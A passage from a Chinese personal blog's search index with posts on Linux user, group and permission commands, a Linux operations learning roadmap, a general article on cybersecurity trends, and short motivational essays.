class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ldif">选项：<br><br><span class="hljs-literal">-</span>u UID: <span class="hljs-comment">#修改用户UID号</span><br><br><span class="hljs-literal">-</span>d 家目录：<span class="hljs-comment">#修改用户家目录</span><br><br><span class="hljs-literal">-</span>G 组名：<span class="hljs-comment">#修改用户的附加组</span><br></code></pre></td></tr></table></figure><p>userdel：删除用户</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ldif">选项：<br><br><span class="hljs-literal">-</span>f ：<span class="hljs-comment">#连通用户家目录一起删除</span><br></code></pre></td></tr></table></figure><p>组用户管理：<br>groupadd：创建用户组</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ldif">选项：<br><br><span class="hljs-literal">-</span>g GID：<span class="hljs-comment">#指定组ID</span><br></code></pre></td></tr></table></figure><p>groupmod：修改用户组</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ldif">选项：<br><br><span class="hljs-literal">-</span>g GID：<span class="hljs-comment">#修改组ID</span><br><br><span class="hljs-literal">-</span>n 新组名：<span class="hljs-comment">#修改组名</span><br></code></pre></td></tr></table></figure><p>groupdel 组名：删除用户组</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#如果该组没有初始用户才可进行删除，要想删除，要优先删除初始用户。</span><br></code></pre></td></tr></table></figure><p>权限管理：<br>chown: #修改文件或目录的拥有者</p><p>chgrp：#修改文件或目录属组</p><p>chmod ：改变文件或目录权限，可以简单的使用三个数字分别对应拥有者/组和其他用户的权限</p><p>chmod +/- rwx文件名|目录名</p><p>对文件的权限<br>r 可使用文件查看类工具，比如：cat，可以获取其内容<br>w 可修改其内容，文件的是否被删除和文件的权限无关<br>x 可以把此文件提请内核启动为一个进程，即可以执行（运行）的文件（次文件的内容必须是可执行）</p><p>常见的数字组合有（u表示用户、g表示组、o表示其他）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">777</span><span class="hljs-operator">=</span>（u<span class="hljs-operator">=</span>rwx，g<span class="hljs-operator">=</span>rwx，o<span class="hljs-operator">=</span>rwx）<br><br><span class="hljs-number">755</span><span class="hljs-operator">=</span>（u<span class="hljs-operator">=</span>rwx，g<span class="hljs-operator">=</span>rx，o<span class="hljs-operator">=</span>rx）<br><br><span class="hljs-number">644</span><span class="hljs-operator">=</span>（u<span class="hljs-operator">=</span>rw，g<span class="hljs-operator">=</span>r，o<span class="hljs-operator">=</span>r）<br><br> --- <span class="hljs-number">0</span><br> --- <span class="hljs-number">0</span><br> r   <span class="hljs-number">4</span><br> r-x <span class="hljs-number">5</span><br> rw  <span class="hljs-number">6</span><br> rwx <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>chmod +x 脚本名 #给脚本赋执行权限</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>第五节</category>
      
    </categories>
    
    
    <tags>
      
      <tag>第一周</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux学习路线</title>
    <link href="/2023/06/28/linux%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"/>
    <url>/2023/06/28/linux%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<p> 错把陈醋当成墨.写尽半生全是酸…</p><p> 如果你自己都对付不了自己，生活就会来对付你。</p><p> 建立自己的目标，干就完了。</p><p>第1阶段（基本）：linux环境下的基本操作命令，包括 文件操作命令(rm mkdir chmod, chown) 编辑工具使用（vi vim）linux用户管理(useradd userdel usermod)等</p><p>第2阶段（基本）：linux的各种配置（环境变量配置，网络配置，服务配置）</p><p>第3阶段（基本）：linux下如何搭建对应语言的开发环境（大数据，JavaEE, Python等）</p><p>第4阶段（基本）：能编写shell脚本，对Linux服务器进行维护。</p><p>第5阶段（进阶）：能进行安全设置，防止攻击，保障服务器正常运行，能对系统调优。</p><p>第6阶段（进阶）：深入理解Linux系统（对内核有研究），熟练掌握大型网站应用架构组成、并熟悉各个环节的部署和维护方法。</p><p>Linux基础：包括对Linux整体的理解/使用和基本命令;</p><p>运维相关的工具(命令)：了解它能解决很多问题;</p><p>基础服务：LAMP或LNMP、Apache、Nginx、MySQL、Perl LAMP、FTP等;</p><p>脚本：必须掌握Shell脚本、额外掌握Python、Perl;</p><p>网络、安全：TCP/IP协议、tcpdump抓包工具、防火墙配置，如iptables、 ipset。</p><p>第一阶段：初级入门初级阶段需要把linux运维学习路线搞清楚，任何学习都是循序渐进的，所以学linux运维也是需要有一定的路线。</p><p>个人建议系统的学习运维路线如下：</p><p>初级入门：</p><p>1、Linux基础知识、基本命令(起源、组成、常用命令如cp、ls、file、mkdir等常见操作命令)</p><p>2、Linux用户及权限基础</p><p>3、Linux系统进程管理进阶</p><p>4、linux高效文本、文件处理命令(vim、grep、sed、awk、find等命令)</p><p>5、shell脚本入门(可边练习边学习)</p><p>第二阶段:中级进阶中级进阶需要在充分了解linux原理和基础知识之后，对上层的应用和服务进行深入学习，其中说到服务肯定涉及到网络的相关知识，是需要花时间学习的。</p><p>1、TCP/IP网络基础(差不多CCNA、NP的知识就够用)</p><p>2、Linux企业常用服务(如dns、http、ftp、mail、nfs等）</p><p>3、Linux企业级安全原理和防范技巧(系统性能/安全、安全威胁模型和保护方法</p><p>4、 加密/解密原理及数据安全、系统服务访问控制及服务安全基础</p><p>5、iptables安全策略构建</p><p>6、shell脚本进阶(主要是结合一些应用，写一些案例)</p><p>7、MySQL应用原理及管理入门(能管理和搭建一个个人博客站点)学到这里，掌握的基本技能，已经够用了，已经能做一些基础的运维工作和简单维护了。</p><p>第三阶段：</p><p>高级提升</p><p>1、http服务代理缓存加速(其中主要学习varnish、nginx缓存系统，要对CDN的知识有所了解。)</p><p>2、企业级负载集群(其中主要学习nginx、haproxy、lvs要对主要知识熟练掌握，对负载均衡算法有清晰认识，)</p><p>3、企业级高可用集群 (其中需要对keepalived，heartbeat等进行深入讲解)</p><p>4、运维监控zabbix详解(主要是zabbix、cacti、nagios等监控系统，现在用的比较多的是zabbix)</p><p>5、运维自动化学习(需要学一些开源运维自动化工具的使用如ansible、puppet、cobbler等运维自动化工具)能掌握到这里，基本能处理搞定很多工作了，可以去面试高级运维工程师，差不多薪资能达到12-18K左右。</p><p>第四阶段：</p><p>资深方向进阶</p><p>1、 大数据方向(需要对hadoop、storm等常见开源大数据系统需要深入了解)</p><p>2、 云计算方向(主要是openstack这套东西，当然像一些kvm等虚拟化技术，也是需要掌握的，现在docker也比较流行)</p><p>3、 运维开发(主要是python运维开发)</p><p>4、 自动化运维(在之前自动化基础上做深入)</p><p>5、 运维架构师(主要需要广度，差不多5年左右以上经验，可以担当此职位)成为一名合格的Linux运维工程师必备的技术点掌握 Iptables 防火墙体系，实现防火墙实现数据包过滤和转发；掌握用户权限安全控制 Sudo 体系与配置；掌握 DNS 服务的原理、部署、安装和企业级应用；实现文件共享服务 NFS、Vsftpd、Samba 配置和应用；实现 Jumpserver 堡垒机 安装、配置、使用和运维体系融合；brctl 命令创建管理虚拟网桥；Ip Netns 创建管理虚拟路由；常见的网络客户端工具 Ping/Lftp/Ftp/Lftpget/Wget；利用 Rsync 和 Inotify 实现多台机器数据分发和配置同步；Jumpserver 跳板机基本功能应用，认证、授权、审计；https 概念及对应的模块 mod_ssl 应用配置；运维必备 Web 服务开源解决⽅案 Nginx，全面讲解 Nginx 程序架构；Nginx 内部框架、模块功能、事务处理机制、安装⽅法、CPU 亲缘优化、配置⽂件；SQL 语句增删改查、常⽤命令使⽤、⽤户授权、字符集修改、表、索引、库管理等；对⽐介绍图形化管理软件，如 PhpMyAdmin、SQLyog、Navicat 等Keepalived 工作方式，Keepalived 核心组件、报警机制、切换机制、心跳信息传输等；Centos7 上实现 LVS 集群配置、服务管理、调度算法修改；全面熟悉 Ansible 用法、以及安装方法、配置文件详解、模块说明、基于私钥认证、批量操作等；Redis 扩展方式对比介绍，Redis Cluster 的基础应用；Vmware Esxi 创建 Linux 及 Windows 虚拟机，并实现虚拟机跨宿主机迁移；Docker 镜像、仓库管理、启动⽅法、数据卷使⽤、备份恢复，网络模型、容器间依赖关系、容器资源限制、Docker 的监控；</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>学习路线</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023年的6种网络安全趋势</title>
    <link href="/2023/06/28/2023%E5%B9%B4%E7%9A%846%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B6%8B%E5%8A%BF/"/>
    <url>/2023/06/28/2023%E5%B9%B4%E7%9A%846%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B6%8B%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>#0#前言</p><p>在过去的几年中，由于互联网已成为我们交流、工作和学习的主要方式，因此人们对其安全性的担忧也越来越多。因为我们的生活中多方面都与网络息息相关，任何违规行为都可能会导致严重的后果。试想，你的财务信息和个人信息都在网上，如果您的网络安全防护装置存有漏洞，那么所有敏感信息都将受到威胁。因此，网络安全已成为当今全球各国重点关注对象。</p><p>随着2020年新冠疫情改变了世界，网络安全变得更加重要。这是因为工作、教育和商业等领域，都尽可能转移到了网上。当您在家时，仅注册Spectrum软件包并使用基本的防病毒软件并不完全解决网络安全的问题。该领域正在不断发展，并正在考虑技术的快速改进。网络安全专家深知世界每天都在变得越来越数字化，因此他们必须在2021年扩大自己的策略计划。5G网络和自动驾驶软件等发明将进一步给这些安全专家带来挑战和机遇。</p><p>1#集成自动化</p><p>如今，大多数制造和数据处理已实现自动化。这意味着只需很少的人力即可完成工作，并且工作可保证精确。但是，这些自动化过程非常复杂，具有多个步骤和方法。因此，不法分子有许多利用的机会。</p><p>网络安全专家也正在通过自动化来尝试解决这些问题。毕竟，人类的速度不可能赶上AI，并且在一定程度上可以防止恶意攻击对程序造成的损害。因此，专家们必须努力找出用自动化防止黑客攻击的最佳方法。</p><p>2#防止汽车被黑客入侵</p><p>虽然自动驾驶汽车是一项伟大的技术创新，但对于数据保护仍存在严重的安全隐患。此外，不仅仅是自动驾驶汽车容易受到攻击。大多数的汽车制造商都在使用云技术和互联网来连接处理汽车数据和操作系统，虽然这些辅助功能非常有用，但是这些薄弱的环节在遭受到任何黑客攻击时，都可能导致可怕的后果。</p><p>因此，网络安全专家需要通过为这些系统和自动驾驶软件创建适当的防护措施来应对这些行业问题。但汽车入侵问题在今年变得越来越普遍，它们需要在安全功能方面加快工作进展。</p><p>3#使用5G的物联网网络</p><p>物联网（IoT）正在成为人们生活中越来越普遍的一部分。现如今，物联网越来越流行，从手机、智能家居、扫地机器人等等事物都已成为物联网生态系统的一部分。在2021年，随着5G网络的普及，这一数字甚至还有望进一步增加。</p><p>因为5G提供的快速性和支持性可以使IoT网络发挥到最大的作用。不过，由于它是一项新技术，所以可能会存在许多安全漏洞。因此，到2021年，网络安全专家将严厉打击IoT网络，并不断为其添加安全补丁。</p><p>4#网络战争</p><p>数字化世界最危险的信号就是是它对战争的影响。政府和军事组织脱离不了互联网的便利性，这使得非常敏感的信息容易受到恶意攻击，所以这就要求把网络安全提高到一个全新的水平。</p><p>通信和情报大部分是通过某种网络或其他网络共享的。即使使用受保护的网络，也存在被黑客入侵的风险，因此，网络安全专家必须不断提供最佳解决方案，以防止灾难性的网络战。</p><p>5#云漏洞</p><p>虽然云存储非常方便，但同时也容易受到黑客攻击或其他形式的泄漏。这是因为如果用户的设备中有恶意软件或病毒，则受到攻击的几率会大大增加。此外，如果用户留有一些漏洞，可能会使整个云处于危险之中。</p><p>因此，网络安全专家必须确保他们拥有可行的解决方案来保护云。</p><p>6#网络安全培训</p><p>网络安全不应仅仅局依赖于专家，使用设备的人还应该知道如何防止黑客入侵和泄漏。对于公司而言，这是一个特别受到重视的问题，因为他们需要保护自己的专有数据和客户数据不受恶意竞争对手的影响。</p><p>因此，我们将看到更多的组织雇用专门的网络安全培训人员，以确保教会员工如何以最佳方式保护数据。</p><p>总结：</p><p>网络安全是一个不断发展的领域，到2021年，随着更多技术的改进和创造，它将变得尤为重要，特别是对于各行业中的企业而言。</p>]]></content>
    
    
    <categories>
      
      <category>2023</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>胜者为王</title>
    <link href="/2023/06/28/%E8%83%9C%E8%80%85%E4%B8%BA%E7%8E%8B/"/>
    <url>/2023/06/28/%E8%83%9C%E8%80%85%E4%B8%BA%E7%8E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="人生不要留有遗憾"><a href="#人生不要留有遗憾" class="headerlink" title="人生不要留有遗憾"></a>人生不要留有遗憾</h1><p>    我干的每件事可能别人都理解不了，也正是因为这个因素，这个世界才出现越来越多的创新型道路。所以别人都理解不了的，那就是发现商机，当然需要破釜沉舟的勇气去实现一个想法，打开一个新的商业体制大门才能成就商机。生活本就不易，何必事事渴求别人理解和认可，如果经历过真正的孤立无助 ，才能不念过往，不畏将来。我不知道什么叫年少轻狂，我只知道胜者为王。</p>]]></content>
    
    
    <categories>
      
      <category>不畏将来</category>
      
    </categories>
    
    
    <tags>
      
      <tag>不念过往</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux成神之路</title>
    <link href="/2023/06/28/linux%E6%88%90%E7%A5%9E%E4%B9%8B%E8%B7%AF/"/>
    <url>/2023/06/28/linux%E6%88%90%E7%A5%9E%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="人生是踏上了就回不了头的路。"><a href="#人生是踏上了就回不了头的路。" class="headerlink" title="人生是踏上了就回不了头的路。"></a>人生是踏上了就回不了头的路。</h1><p>    科技改变生活，作为创造科技的主力之一的IT人，更有着无比有趣的生活理念和思维模式。而在IT人与其他行业的人交流日益频繁的今天，希望大家在小组的交流中，大家都能得到一些启发吧。</p><span id="more"></span><p>我们是一群有着梦想的怪人，</p><p>我们是一群文质彬彬的学者，</p><p>我们是一群特立独行的游侠，</p><p>我们是一群神秘奇特的IT人。</p><p>欢迎大家一起融入IT人的生活。</p><p>    我们认为真正的民族主义者以追求本民族――中华民族的利益最大化为目标、准则、信念。判断一个人是不是真正的民族主义者，判断标准很简单：看他是给本民族的整体利益带来好处，还是损害民族利益。真正的民族主义者最务实，因为他知道坚持原则，同时又懂得策略</p><div class="code-wrapper"><pre><code class="hljs">    香烟到头都是灰，故事到头终是悲，时光流逝不可复得，且行且珍惜。</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>成神</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
